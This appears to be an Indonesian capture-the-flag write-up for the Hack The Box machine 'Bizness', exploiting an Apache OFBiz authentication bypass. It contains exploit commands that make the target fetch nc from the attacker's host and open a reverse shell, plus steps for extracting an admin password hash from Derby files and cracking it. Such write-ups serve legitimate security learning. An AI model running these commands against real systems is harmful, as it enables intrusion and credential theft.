# Bizness HTB
```bash
ipTarget=10.10.11.252
```
Pertama, tentunya lakukan enumerasi terhadap `ipTarget`, disini saya menggunakan `rustscan`
```bash
rustscan -a 10.10.11.252 -- -A | tee zcan
...
Open 10.10.11.252:22                                                                                      
Open 10.10.11.252:80
Open 10.10.11.252:443
Open 10.10.11.252:39571
Open 10.10.11.252:46503
...
22/tcp    open  ssh        syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
...
80/tcp    open  http       syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   syn-ack nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
...
39571/tcp open  tcpwrapped syn-ack
46503/tcp open  tcpwrapped syn-ack
```
Selanjutnya kita add `ipTarget` ke `/etc/hosts`
```bash
sudo echo "10.10.11.252	bizness.htb" >> /etc/hosts
```

Lalu kita lakukan enumerate direktori pada web target
```bash
dirb https://bizness.htb
...
==> DIRECTORY: https://bizness.htb/accounting/
...
```
Kita akan mendapat cukup banyak direktori, namun jika kita buka, semuanya pasti akan tersambung ke `https://bizness.htb/<dir>/control/login` yang mana memberikan login page dari service `Apache OFBiz`. Jika kita search exploit dari service tersebut, maka akan keluar beberapa PoC, namun disini saya mengacu pada artikel report dari [sonicwall](https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/). Dimana dalam report tersebut dijelaskan bahwa versi 18.12 pada `Apache OFBiz` terdapat SSRF vulnerability dan bypass authentication. Jika kita melakukan request ke link `curl "https://bizness.htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y" -k --raw` maka akan menghasilkan output seperti berikut
```bash
curl "https://bizness.htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y" -k --raw
...
6


PONG
0
```
Untuk hal ini, kita akan menggunakan exploit dari [jakabakos](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) di github. Kita akan coba untuk mendapatkan revshell dengan cara siapkan listener terlebih dahulu
```bash
rlwrap ncat -lvnp 8888
```
Selanjutnya kita akan menggunakan `nc` untuk mendapat revshell
```bash
cp /usr/bin/nc .
python3 -m http.server 80
```
Selanjutnya kita lakukan request SSRF menggunakan exploit dari git
```bash
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
cd Apache-OFBiz-Authentication-Bypass
python3 exploit.py --url https://bizness.htb --cmd 'wget http://<local-IP>/nc'
python3 exploit.py --url https://bizness.htb --cmd 'nc <local-IP> 8888 -c /bin/bash'
```
Nantinya kita akan mendapat response seperti berikut jika telah berhasil mendapatkan session shell
```bash
rlwrap ncat -lvnp 8888 
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.11.252:34344.
```
Kita dapat melakukan stabilize shell dengan python3
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
...
* CTRL+Z
...
stty raw -echo; fg
```
Selanjutnya kita dapat melihat user flag di `/home/ofbiz/user.txt`.

Untuk mendapatkan user root, disini saya agak kesusahan. Namun setelah sedikit membaca writeups dari [Nathanule](https://nathanule99.gitbook.io/ctf-write-ups/walk-throughs/htb-linux-machines/bizness-htb), saya bisa mendapatkan root flag. Cara darinya adalah kita melakukan enumerasi file dengan beberapa file extensions, yang mana disini adalah `.xml`
```bash
find / -type f -name '*.xml' 2>/dev/null
...
/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
...
```
yang mana berisi
```bash
cat /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
...
...
<entity-engine-xml>
    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/>
    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
</entity-engine-xml>
```
Kita mendapatkan hashed password `{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a`. Ketika dicek dengan `hashid` kita mendapat `SHA1`, namun ketika dicrack tidak bisa.
Selanjutnya lakukan enumerasi dengan `linpeas.sh`
```bash
wget http://<localIP>:5120/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
...
...
/opt/ofbiz/runtime/data/derby/ofbiz/log/log31.dat
```
Kita akan melakukan enumerasi file pada `derby`. `Derby` atau `Apache Derby` merupakan RDBMS open source yang menggunakan java. Disini menjadi hal menarik, karena kita dapat mencoba untuk menggali informasi pada `.dat` files dengan menggunakan `strings`. Karena dapat mencoba untuk mencari tahu file `.dat` ada dimana saja dengan cara
```bash
find / -type f -name '*.dat' 2>/dev/null
...
...
/var/cache/debconf/passwords.dat                                                                          
/var/cache/debconf/templates.dat                                                                          
/var/cache/debconf/config.dat                                                                             
/usr/lib/jvm/java-11-openjdk-amd64/lib/tzdb.dat                                                           
/usr/share/GeoIP/GeoIP.dat                                                                                
/usr/share/GeoIP/GeoIPv6.dat                                                                              
/usr/share/publicsuffix/public_suffix_list.dat                                                            
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c10001.dat                                                       
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c7161.dat                                                        
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c12fe1.dat                                                       
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cf4f1.dat                                                        
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cc3f1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cc581.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c11601.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c9151.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c101.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cebd1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cdd21.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c63e1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c14731.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c9131.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c93a1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c2150.dat
...
```
Dan kebanyakan file `.dat` berada di `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/`, maka kita dapat mengambil semua isinya dan memasukkannya ke dalam 1 file txt. Lalu mencari hash yang kita butuhkan dengan `strings`
```bash
cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/*.d > dat_files.txt
strings dat_files.txt | grep -i SHA
...
# output
...
<eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
...
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```
Kita mendapatkan hashed password `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`. Selanjutnya kita dapat melakukan crack password dengan script python dari [Nathanule](https://nathanule99.gitbook.io/ctf-write-ups/walk-throughs/htb-linux-machines/bizness-htb).
```bash
python3 crack.py
Processing:  10%|████▎                                     | .../14344392 [00:02<00:23, 559434.41it/s]Found Password:<password>, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
Processing:  10%|████▎                                     | .../14344392 [00:02<00:23, 554451.24it/s]
```
dan kita bisa privesc ke root user.